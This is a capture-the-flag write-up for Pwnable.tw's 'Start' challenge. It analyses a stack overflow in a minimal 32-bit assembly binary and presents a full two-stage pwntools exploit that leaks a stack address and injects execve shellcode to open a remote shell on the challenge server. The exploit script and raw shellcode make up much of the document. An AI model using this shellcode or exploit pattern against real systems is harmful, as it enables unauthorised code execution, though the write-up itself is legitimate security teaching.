---
title: 'Pwnable.tw: Start'
date: 2019-01-01T00:00:00.000Z
excerpt: >-
  A shellcode injection writeup for Pwnable.tw's Start challenge, exploiting a
  stack-based buffer overflow in a minimal 32-bit Linux binary with no NX
  protection.
tags:
  - wargame
  - writeup
  - pwn
  - pwnable-tw
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Overview

Start is a minimal 32-bit Linux binary written in pure x86 assembly, with no libc. There's no stack protection and no NX either. The challenge involves leaking a stack address and then injecting shellcode.

## Source

```asm
push    esp
push    offset _exit
xor     eax, eax
xor     ebx, ebx
xor     ecx, ecx
xor     edx, edx
push    3A465443h
push    20656874h
push    20747261h
push    74732073h
push    2774654Ch       ; "Let's start the CTF:"
mov     ecx, esp        ; addr
mov     dl, 14h         ; len = 20
mov     bl, 1           ; fd = stdout
mov     al, 4
int     80h             ; sys_write(1, esp, 20)
xor     ebx, ebx
mov     dl, 3Ch         ; len = 60
mov     al, 3
int     80h             ; sys_read(0, ecx, 60)
add     esp, 14h        ; restore 20 bytes of stack
retn
```

## Analysis

The flow of this code:
1. Zero out `eax`, `ebx`, `ecx`, and `edx`
2. Push the string `"Let's start the CTF:"` (5 dwords = 20 bytes) onto the stack
3. Copy `esp` into `ecx` -- the buffer address parameter for `sys_write` -- `esp` itself is unchanged
4. Call `sys_write(stdout, esp, 20)` to print the prompt
5. Call `sys_read(stdin, ecx, 60)` -- read 60 bytes into the same `ecx` (which points at the stack)
6. `add esp, 0x14` removes the 20-byte string data from the stack
7. `retn` executes -- pops the next value off the stack and uses it as the return address

The read call accepts 60 bytes, but the string data is only 20 bytes. After `add esp, 0x14`, the 4 bytes right after the string data become the return address. In other words, a 20-byte buffer plus 4-byte ret overwrite is possible.

## Exploit Strategy

Core idea: `esp` doesn't change between the `sys_write` and `sys_read` calls. When the string is pushed onto the stack before the output, the current `esp` value goes straight into `ecx`.

If we redirect `ret` to the `mov ecx, esp` instruction (`0x8048087`), the program executes `sys_write(stdout, esp, 20)` one more time. Since `add esp, 0x14` has already shifted the stack by 20 bytes, this leaks the return address region.

The leaked 4 bytes are an actual stack address. Adding `0x14` to it points exactly to where the shellcode will sit in the second payload.

## Solution

```python
from pwn import *

p = remote("chall.pwnable.tw", 10000)
#p = process("./start")

context.arch = 'i386'

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

print p.recvuntil("Let's start the CTF:")

# Stage 1: overwrite ret with 0x8048087 (mov ecx, esp) to leak a stack address
payload = ""
payload += "A" * 20          # fill the string buffer
payload += p32(0x8048087)    # ret -> back to mov ecx, esp -> re-runs sys_write

p.send(payload)

# The second sys_write prints 20 bytes starting from the shifted esp
leak = u32(p.recv(4))
print "leak : ", hex(leak)
p.recv()

# Stage 2: send shellcode; jump to leak+0x14 (after the 20-byte padding)
payload2 = ""
payload2 += "\x90" * 0x14   # NOP sled / padding
payload2 += p32(leak + 0x14) # ret -> stack address where the shellcode starts
payload2 += shellcode

p.send(payload2)

p.interactive()
```

## Payload Breakdown

**Stage 1**

```
[A * 20][0x8048087]
  ^           ^
  |           |
  filler      ret -> mov ecx, esp (leaks esp via a re-run of write)
```

**Stage 2**

```
[NOP * 20][leak + 0x14][shellcode]
               ^
               ret -> shellcode executes
```

The leaked address is the value of `esp` at the time of the second `sys_write`. Since `esp` shifts by `0x14` on each `add esp, 0x14`, adding `0x14` to the leaked value gives the address right after the padding in the second payload -- exactly where the shellcode starts.
